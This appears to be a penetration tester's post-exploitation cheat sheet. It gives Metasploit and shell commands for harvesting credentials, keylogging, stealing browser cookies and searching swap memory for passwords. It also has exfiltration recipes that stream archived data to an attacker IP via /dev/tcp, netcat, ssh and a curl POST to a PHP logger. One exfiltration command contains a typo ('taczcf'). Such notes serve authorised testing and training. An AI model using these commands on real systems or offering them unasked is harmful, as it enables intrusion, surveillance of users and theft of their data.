# Gather info
## Metasploit
* `meterpreter> run post/windows/gather/*`
* `meterpreter> run post/linux/gather/*`
* `meterpreter> run post/windows/gather/credentials/*`
* `meterpreter> run post/linux/gather/credentials/*`
* `run post/windows/gather/credentials/credential_collector`
* `meterpreter> run post/windows/gather/enum_domains`
* `meterpreter> run post/windows/gather/enum_ad_users`
* `meterpreter> run post/windows/gather/enum_shares`
* `meterpreter> run post/windows/gather/enum_applications`

## Windows
* `net view /domain`
* `net group "<domain-name>" /domain` - get list of domain controllers
* `net users`
* `net localgroup <group-name>`
* `net share`
</br>__Services__</br>
* `tasklist /svc`
</br>__Privileges__</br>
* `whoami /priv`
* `whoami /groups`
* `whoami /all`
</br>__Powershell__</br>
  * `Get-Process -IncludeUserName | Where-Object {$_.UserName -match "SYSTEM"} | Format-List -Property Username,Name,Id` - identify SYSTEM processes 

## Linux
* `cat /etc/passwd`
* Pilfering credentials from sqp memory
   * `swapon -s` or `cat /proc/swaps` -get swap partition
   * `strings </dev/sda5> | grep "password"` - search "password" text in the swap partition
* `./swap_digger.sh` - https://github.com/sevagas/swap_digger
 

## Cool resources
* Windows
    * https://docs.google.com/document/d/1U10isynOpQtrIK6ChuReu-K1WHTJm4fgG3joiuz43rw/edit?hl=en_US
    * https://tim3warri0r.blogspot.com/
* Linux
    * https://docs.google.com/document/d/1ObQB6hmVvRPCgPTRZM5NMH034VDM-1N-EWPRz2770K4/edit?hl=en_US
    * https://book.hacktricks.xyz/linux-hardening/linux-post-exploitation
* OSX        - https://docs.google.com/document/d/10AUm_zUdAQGgoHNo_eS0SO1K-24VVYnulUD2x3rJD3k/edit?hl=en_US
* Metasploit - https://docs.google.com/document/d/1ZrDJMQkrp_YbU_9Ni9wMNF2m3nIPEA_kekqqqA2Ywto/edit?pref=2&pli=1


# Gather data
## Metasploit
* `meterpreter> run scraper`

* `meterpreter> run post/multi/gather/*` - double tab to see all modules
* `meterpreter> screenshot`
* keylogging
   * screen unlock          -> attach process to __winlogon.exe__
   * application keystrokes -> attach processes to __explorer.exe__
   * `meterpreter> keyscan_start` - start sniffer
   1. `meterpreter> keyscan_dump` - print keystrikes on screen
   2. `meterpreter> keyscan_stop` - stop sniffer
  </br>or</br>
   * `meterpreter> keylogrecorder` - start sniffer
**Windows**
* `meterpreter> run winenum`
* `meterpreter> run post/windows/gather/credentials` - double tab to see all modules
* `meterpreter> run post/windows/gather/enum_chrome` - chrome data: cookies, credentials, history
* `meterpreter> run post/windows/gather/credentials/credential_collector`
**Linux**
* msf> `use post/linux/gather/enum_configs`
* msf> `use post/linux/gather/enum_system`
* msf> `use post/linux/*` - double tab to see options

**General Tactics**
* dump browser cache
* dump browser bookmarks
* setup sniffers on victim

## Other tools
* SessionGopher - dump local credentials (Windows)

# Data exfiltration
* TCP socket with EBCDIC and Base64
   * attacker system: `nc -lvp 80 > datafolder.tmp`
   * target system: `taczcf - /tmp/datafolder | base64 | dd conv=ebcdic > /dev/tcp/<attacker-IP>/80`
   * attacker machine: `dd conv=ascii if=datafolder.tmp | base64 -d > datafolder.tar`
   * attacker machine: `tar xf datafolder.tar`
* SSH
   * target system: `tar zcf - /tmp/datafolder | ssh <user>@<attacker-IP> "cd /tmp; tar zxpf -"`
* POST request over HTTPS
   * attacker system: create php file (contact.php) to log data: `<? php file_put_contents('/tmp/datafolder.base64', file_get_contents('php://input')); ?>`
   * attacker system: `php -S <IP>:8000`
   * target system: `curl --data "$(tar zcf - /tmp/datafolder | base64)" https://<attacker-IP>/contact.php`
   * target system: `cat /tmp/datafolder.base64 | base64 -d > datafolder.tar && tar xf datafolder.tar`

## Cool resources
* https://wiki.zacheller.dev/pentest/post-exploitation/file-transfers

